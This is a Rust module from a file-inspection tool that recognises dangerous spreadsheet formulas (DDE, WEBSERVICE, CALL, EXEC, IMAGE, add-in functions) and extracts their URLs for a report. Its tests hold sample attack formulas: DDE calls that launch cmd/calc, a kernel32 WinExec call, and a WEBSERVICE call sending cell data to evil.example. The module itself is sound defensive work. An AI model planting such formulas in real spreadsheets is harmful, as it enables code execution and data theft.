//! Spreadsheet formula triage (OOXML, ODF, CSV).
//!
//! Arca never evaluates `WEBSERVICE`, `CALL`, `REGISTER`, `EXEC`, `RTD`,
//! `IMAGE` or DDE references; this module only recognises them so the X-ray
//! can tell the user what the file would have done in a spreadsheet program.

use crate::report::{RefKind, ThreatKind};
use crate::{Ctx, ooxml};

/// Risk recognised in a formula.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Risk {
    /// Dynamic Data Exchange reference (`cmd|'/c calc'!A0`, `DDE(...)`).
    Dde,
    /// A function that executes code or reaches the network.
    Function(&'static str),
}

const DANGEROUS: &[(&str, &str)] = &[
    ("WEBSERVICE", "WEBSERVICE (HTTP request)"),
    ("CALL", "CALL (native DLL call)"),
    ("REGISTER", "REGISTER (native DLL registration)"),
    ("REGISTER.ID", "REGISTER.ID (native DLL registration)"),
    ("EXEC", "EXEC (process execution)"),
    ("RTD", "RTD (COM real-time data server)"),
    ("IMAGE", "IMAGE (fetches a remote picture)"),
    ("STOCKHISTORY", "STOCKHISTORY (online data)"),
    ("SHELL", "SHELL (process execution)"),
    ("DDE", "DDE"),
    ("DDEAUTO", "DDEAUTO"),
];

/// Words whose presence (in any letter case) is *necessary* for [`assess`] to
/// report a function risk or for [`url_uses`] to find a URL function.
const RISK_WORDS: &[&[u8]] = &[
    b"WEBSERVICE",
    b"CALL",
    b"REGISTER",
    b"EXEC",
    b"RTD",
    b"IMAGE",
    b"STOCKHISTORY",
    b"SHELL",
    b"DDE",
    b"HYPERLINK",
    b"_XLL.",
];

/// Cheap, allocation-free pre-filter: `false` guarantees that neither
/// [`assess`] nor [`url_uses`] can find anything in `formula`, so the vast
/// majority of ordinary formulas (`SUM(B2:D2)`, `A1*1.2`) skip the
/// allocation-heavy analysis. `true` only means "look closer".
///
/// The analysis matches ASCII-case-insensitively against fixed words and
/// treats `|` as the DDE separator; [`prefilter_is_a_superset`] (tests) pins
/// that this function never answers `false` where the analysis would hit.
pub(crate) fn may_contain_risk(formula: &str) -> bool {
    let bytes = formula.as_bytes();
    if bytes.contains(&b'|') {
        return true;
    }
    bytes.iter().enumerate().any(|(i, first)| {
        let first = first.to_ascii_uppercase();
        RISK_WORDS.iter().any(|word| {
            word.first() == Some(&first)
                && bytes
                    .get(i..i + word.len())
                    .is_some_and(|window| window.eq_ignore_ascii_case(word))
        })
    })
}

/// Records the risks and URL arguments of one formula as findings and blocked
/// external references.
pub(crate) fn report(ctx: &mut Ctx<'_>, formula: &str, loc: &str) {
    if !may_contain_risk(formula) {
        return;
    }
    for risk in assess(formula) {
        match risk {
            Risk::Dde => ctx.report.add(ThreatKind::DdeFormula, loc, format!("={formula}")),
            Risk::Function(label) => {
                ctx.report.add(ThreatKind::DangerousFormula, loc, format!("{label}: ={formula}"));
            }
        }
    }
    record_urls(ctx, formula, loc);
}

/// Strips the ODF formula namespace prefix (`of:=`, `oooc:=`, `ooow:=`).
pub(crate) fn strip_odf_prefix(formula: &str) -> &str {
    let f = formula.trim();
    match f.split_once('=') {
        Some((prefix, rest)) if prefix.chars().all(|c| c.is_ascii_alphabetic() || c == ':') => rest,
        _ => f,
    }
}

/// Targets of external-document references in an ODF formula
/// (`'file:///share/x.ods'#$Sheet1.A1`): a quoted document name followed by `#`.
pub(crate) fn odf_document_refs(formula: &str) -> Vec<String> {
    // A document reference is a quoted name followed by `#`.
    if !(formula.contains('\'') && formula.contains('#')) {
        return Vec::new();
    }
    let chars: Vec<char> = formula.chars().take(MAX_FORMULA_CHARS).collect();
    let mut out: Vec<String> = Vec::new();
    let mut i = 0usize;
    while let Some(&c) = chars.get(i) {
        if out.len() >= MAX_URLS_PER_FORMULA {
            break;
        }
        if c == '"' {
            // Skip string literals (`""` is an escaped quote).
            i += 1;
            while let Some(&d) = chars.get(i) {
                i += 1;
                if d == '"' {
                    if chars.get(i) == Some(&'"') {
                        i += 1;
                        continue;
                    }
                    break;
                }
            }
            continue;
        }
        if c == '\'' {
            let mut name = String::new();
            i += 1;
            while let Some(&d) = chars.get(i) {
                i += 1;
                if d == '\'' {
                    if chars.get(i) == Some(&'\'') {
                        name.push('\'');
                        i += 1;
                        continue;
                    }
                    break;
                }
                name.push(d);
            }
            if chars.get(i) == Some(&'#')
                && crate::url::leaves_package(&name)
                && !out.contains(&name)
            {
                out.push(name);
            }
            continue;
        }
        i += 1;
    }
    out
}

/// Records the URL arguments of `IMAGE`, `WEBSERVICE` and `HYPERLINK` in
/// `formula` as blocked external references (with their usual findings), so
/// the address — not only the function name — is visible in the X-ray.
pub(crate) fn record_urls(ctx: &mut Ctx<'_>, formula: &str, loc: &str) {
    if !may_contain_risk(formula) {
        return;
    }
    for u in url_uses(formula) {
        let (kind, auto_load) = match u.function {
            UrlFunction::Image => (RefKind::Image, true),
            UrlFunction::WebService => (RefKind::DataConnection, true),
            UrlFunction::Hyperlink => (RefKind::Hyperlink, false),
        };
        ooxml::record_external(ctx, &u.target, kind, auto_load, loc);
    }
}

/// Splits off string literals so that `"a|b!c"` inside quotes is ignored.
fn code_only(formula: &str) -> String {
    let mut out = String::with_capacity(formula.len());
    let mut in_str = false;
    for c in formula.chars() {
        if c == '"' {
            in_str = !in_str;
            out.push(' ');
        } else if !in_str {
            out.push(c);
        }
    }
    out
}

/// Assesses one formula.
pub(crate) fn assess(formula: &str) -> Vec<Risk> {
    let code = code_only(formula);
    let mut out = Vec::new();
    // DDE: `app|topic!item`, possibly with the topic in single quotes. Every
    // pipe is examined (a harmless earlier `|` must not mask a later DDE
    // reference) and blanks before the pipe are tolerated.
    if code.match_indices('|').take(64).any(|(bar, _)| {
        let before = code.get(..bar).unwrap_or("").trim_end();
        let app: String = before
            .chars()
            .rev()
            .take_while(|c| c.is_alphanumeric() || matches!(c, '_' | '.' | '\'' | '-'))
            .collect();
        let after = code.get(bar + 1..).unwrap_or("");
        !app.trim_matches('\'').is_empty() && after.contains('!')
    }) {
        out.push(Risk::Dde);
    }
    let upper = code.to_ascii_uppercase();
    let bytes = upper.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        let is_ident = |b: u8| b.is_ascii_alphanumeric() || b == b'_' || b == b'.';
        if bytes.get(i).is_some_and(|b| b.is_ascii_alphabetic() || *b == b'_')
            && (i == 0 || !bytes.get(i - 1).copied().is_some_and(is_ident))
        {
            let start = i;
            while bytes.get(i).copied().is_some_and(is_ident) {
                i += 1;
            }
            let mut j = i;
            while bytes.get(j) == Some(&b' ') {
                j += 1;
            }
            if bytes.get(j) == Some(&b'(') {
                let name = upper.get(start..i).unwrap_or("");
                let bare = name
                    .trim_start_matches("COM.MICROSOFT.")
                    .trim_start_matches("_XLFN.")
                    .trim_start_matches("_XLWS.")
                    .trim_start_matches("_XLETA.");
                if name.starts_with("_XLL.") {
                    push(&mut out, Risk::Function("_xll. add-in function (native code)"));
                } else if let Some((_, label)) = DANGEROUS.iter().find(|(n, _)| *n == bare) {
                    if bare.starts_with("DDE") {
                        push(&mut out, Risk::Dde);
                    } else {
                        push(&mut out, Risk::Function(label));
                    }
                }
            }
        } else {
            i += 1;
        }
    }
    out
}

/// Functions whose first argument is a URL that Excel / LibreOffice fetches or
/// opens.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum UrlFunction {
    /// `IMAGE(url)`: fetches a picture when the sheet is calculated.
    Image,
    /// `WEBSERVICE(url)`: performs an HTTP request when calculated.
    WebService,
    /// `HYPERLINK(url, …)`: opened on click.
    Hyperlink,
}

/// A URL literal found in the first argument of a [`UrlFunction`] call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct UrlUse {
    pub(crate) function: UrlFunction,
    pub(crate) target: String,
}

/// Formula text analysed per call; Excel itself limits formulas to 8 192 chars.
const MAX_FORMULA_CHARS: usize = 8_192;
/// Candidate URLs reported per formula.
const MAX_URLS_PER_FORMULA: usize = 8;

/// Extracts the URL string literals passed to `IMAGE`, `WEBSERVICE` and
/// `HYPERLINK`, so that the address — not just the function — reaches the
/// "blocked external references" list.
///
/// For `WEBSERVICE("http://evil/?"&A1&"x")` the literals of the first argument
/// are returned joined (`http://evil/?x`) and, if URL-like, individually. Cell
/// references cannot be resolved here and are skipped; the literal prefix is
/// what identifies the destination.
pub(crate) fn url_uses(formula: &str) -> Vec<UrlUse> {
    let chars: Vec<char> = formula.chars().take(MAX_FORMULA_CHARS).collect();
    let mut out: Vec<UrlUse> = Vec::new();
    let mut i = 0usize;
    let mut in_str = false;
    while let Some(&c) = chars.get(i) {
        if out.len() >= MAX_URLS_PER_FORMULA {
            break;
        }
        if c == '"' {
            in_str = !in_str;
            i += 1;
            continue;
        }
        let ident_start = c.is_alphabetic() || c == '_';
        let prev_is_ident = i
            .checked_sub(1)
            .and_then(|p| chars.get(p))
            .is_some_and(|p| p.is_alphanumeric() || matches!(p, '_' | '.'));
        if in_str || !ident_start || prev_is_ident {
            i += 1;
            continue;
        }
        let start = i;
        while chars.get(i).is_some_and(|c| c.is_alphanumeric() || matches!(c, '_' | '.')) {
            i += 1;
        }
        let name: String = chars.get(start..i).unwrap_or(&[]).iter().collect::<String>();
        let upper = name.to_ascii_uppercase();
        let bare = upper
            .trim_start_matches("COM.MICROSOFT.")
            .trim_start_matches("_XLFN.")
            .trim_start_matches("_XLWS.")
            .trim_start_matches("_XLETA.");
        let function = match bare {
            "IMAGE" => UrlFunction::Image,
            "WEBSERVICE" => UrlFunction::WebService,
            "HYPERLINK" => UrlFunction::Hyperlink,
            _ => continue,
        };
        let mut j = i;
        while chars.get(j) == Some(&' ') {
            j += 1;
        }
        if chars.get(j) != Some(&'(') {
            continue;
        }
        for target in first_argument_urls(&chars, j + 1) {
            let candidate = UrlUse { function, target };
            if !out.contains(&candidate) && out.len() < MAX_URLS_PER_FORMULA {
                out.push(candidate);
            }
        }
        // Scanning resumes right after the `(`, so nested calls are found too.
        i = j + 1;
    }
    out
}

/// URL-like values of the call's first argument (from just after the `(`).
///
/// String literals joined by `&` form one value (`"http://"&A1&"x"` →
/// `http://x`); a comma inside the argument (an `IF(c, "a", "b")` branch)
/// starts a new value.
fn first_argument_urls(chars: &[char], from: usize) -> Vec<String> {
    let mut values: Vec<String> = Vec::new();
    let mut current = String::new();
    let mut depth = 0usize;
    let mut i = from;
    while let Some(&c) = chars.get(i) {
        match c {
            '"' => {
                i += 1;
                while let Some(&d) = chars.get(i) {
                    if d == '"' {
                        if chars.get(i + 1) == Some(&'"') {
                            current.push('"');
                            i += 2;
                            continue;
                        }
                        break;
                    }
                    current.push(d);
                    i += 1;
                }
            }
            '(' => depth += 1,
            ')' if depth == 0 => break,
            ')' => depth -= 1,
            ',' | ';' => {
                values.push(core::mem::take(&mut current));
                if depth == 0 {
                    break;
                }
            }
            _ => {}
        }
        i += 1;
    }
    values.push(current);
    let mut urls: Vec<String> = Vec::new();
    for value in values {
        let t = value.trim();
        if !t.is_empty()
            && crate::url::classify(t) != crate::report::TargetClass::Relative
            && !urls.iter().any(|u| u == t)
        {
            urls.push(t.to_owned());
        }
    }
    urls
}

fn push(v: &mut Vec<Risk>, r: Risk) {
    if !v.contains(&r) {
        v.push(r);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn prefilter_is_a_superset() {
        // Token soup around every risk word, in several letter cases and with
        // decoys: whenever the analysis finds something, the pre-filter must
        // have said "look closer".
        const TOKENS: &[&str] = &[
            "WEBSERVICE",
            "webservice",
            "WebService",
            "CALL",
            "call",
            "REGISTER",
            "REGISTER.ID",
            "EXEC",
            "exec",
            "RTD",
            "rtd",
            "IMAGE",
            "image",
            "STOCKHISTORY",
            "SHELL",
            "shell",
            "DDE",
            "dde",
            "DDEAUTO",
            "HYPERLINK",
            "HyperLink",
            "_xll.",
            "_XLL.",
            "_xlfn.",
            "COM.MICROSOFT.",
            "MYCALL",
            "RECALL",
            "(",
            ")",
            "\"",
            "'",
            "|",
            "!",
            ",",
            ";",
            " ",
            "A1",
            "B2:C3",
            "+",
            "&",
            "http://x.example/",
            "cmd",
            "Évil",
            "İ",
            "ſ",
            "K",
        ];
        let mut x = 0x9E37_79B9_7F4A_7C15_u64;
        let mut next = move || {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            x
        };
        let mut risky = 0usize;
        for _ in 0..30_000 {
            let n = 1 + usize::try_from(next() % 12).unwrap_or(1);
            let formula: String = (0..n)
                .map(|_| TOKENS[usize::try_from(next() % TOKENS.len() as u64).unwrap_or(0)])
                .collect();
            let found = !assess(&formula).is_empty()
                || !url_uses(&formula).is_empty()
                || !odf_document_refs(&formula).is_empty();
            risky += usize::from(found);
            let hidden =
                found && !may_contain_risk(&formula) && odf_document_refs(&formula).is_empty();
            assert!(!hidden, "pre-filter would hide a finding in {formula:?}");
        }
        assert!(risky > 500, "the generator must actually produce findings ({risky})");
        // Ordinary formulas are skipped.
        for f in ["SUM(B2:D2)", "A1*1.2", "IF(A1>0,\"yes\",\"no\")", "VLOOKUP(A2,Sheet2!A:B,2,0)"] {
            assert!(!may_contain_risk(f), "{f}");
        }
    }

    #[test]
    fn dde_variants() {
        assert_eq!(assess("cmd|' /C calc'!A0"), vec![Risk::Dde]);
        assert_eq!(
            assess("MSEXCEL|'\\..\\..\\..\\Windows\\System32\\cmd.exe /c calc.exe'!''"),
            vec![Risk::Dde]
        );
        assert_eq!(assess("DDE(\"cmd\";\"/C calc\";\"x\")"), vec![Risk::Dde]);
        assert!(assess("\"a|b!c\"&A1").is_empty(), "pipes inside strings are text");
        assert!(assess("SUM(A1:A3)").is_empty());
    }

    #[test]
    fn dangerous_functions() {
        assert_eq!(
            assess("_xlfn.WEBSERVICE(\"http://x\")"),
            vec![Risk::Function("WEBSERVICE (HTTP request)")]
        );
        assert_eq!(
            assess("CALL(\"kernel32\",\"WinExec\",\"JCJ\",\"calc\",0)"),
            vec![Risk::Function("CALL (native DLL call)")]
        );
        assert_eq!(
            assess("RTD(\"prog.id\",,\"x\")"),
            vec![Risk::Function("RTD (COM real-time data server)")]
        );
        assert_eq!(
            assess("_xll.Evil(1)"),
            vec![Risk::Function("_xll. add-in function (native code)")]
        );
        assert!(assess("MYCALL(1)").is_empty(), "substring matches must not trigger");
    }

    #[test]
    fn dde_after_an_earlier_harmless_pipe() {
        // A first `|` with no identifier before it must not mask the real DDE.
        assert_eq!(assess("IF(1,1)|cmd|' /C calc'!A0"), vec![Risk::Dde]);
        // Blanks before the pipe are tolerated.
        assert_eq!(assess("cmd |' /C calc'!A0"), vec![Risk::Dde]);
        assert!(assess("A1|B1").is_empty());
    }

    fn urls(f: &str) -> Vec<(UrlFunction, String)> {
        url_uses(f).into_iter().map(|u| (u.function, u.target)).collect()
    }

    #[test]
    fn urls_are_extracted_from_network_functions() {
        assert_eq!(
            urls(r#"WEBSERVICE("http://evil.example/c?d="&A1)"#),
            vec![(UrlFunction::WebService, "http://evil.example/c?d=".to_owned())]
        );
        assert_eq!(
            urls(r#"_xlfn.IMAGE("https://t.example/p.png")"#),
            vec![(UrlFunction::Image, "https://t.example/p.png".to_owned())]
        );
        assert_eq!(
            urls(r#"HYPERLINK("\\evil\share\x", "click")"#),
            vec![(UrlFunction::Hyperlink, r"\\evil\share\x".to_owned())]
        );
        // Split literals are joined; nested calls are found; whitespace tolerated.
        assert_eq!(
            urls(r#"WEBSERVICE ("http://"&"split.example/x")"#),
            vec![(UrlFunction::WebService, "http://split.example/x".to_owned())]
        );
        assert_eq!(
            urls(r#"IMAGE(IF(A1,"http://a.example/1.png","http://b.example/2.png"))"#),
            vec![
                (UrlFunction::Image, "http://a.example/1.png".to_owned()),
                (UrlFunction::Image, "http://b.example/2.png".to_owned()),
            ]
        );
        assert_eq!(
            urls(r#"HYPERLINK(WEBSERVICE("http://inner.example/"), "x")"#),
            vec![
                (UrlFunction::Hyperlink, "http://inner.example/".to_owned()),
                (UrlFunction::WebService, "http://inner.example/".to_owned()),
            ]
        );
    }

    #[test]
    fn url_extraction_ignores_non_urls_and_text() {
        assert!(urls(r#"WEBSERVICE(A1)"#).is_empty());
        assert!(urls(r##"HYPERLINK("#sheet2", "x")"##).is_empty());
        // A URL call quoted inside a string literal is text, not a call.
        assert!(urls("SUM(1,2)&\"WEBSERVICE(\"\"http://x\"\")\"").is_empty());
        assert!(urls(r#"MYIMAGE("http://x.example")"#).is_empty());
        assert!(urls("").is_empty());
    }

    #[test]
    fn url_extraction_is_bounded() {
        let many: String =
            (0..100).map(|i| format!(r#"HYPERLINK("http://h{i}.example/"),"#)).collect();
        assert!(url_uses(&many).len() <= 8);
        let long = format!("WEBSERVICE(\"http://{}\")", "a".repeat(100_000));
        let _ = url_uses(&long); // must not blow up
    }
}
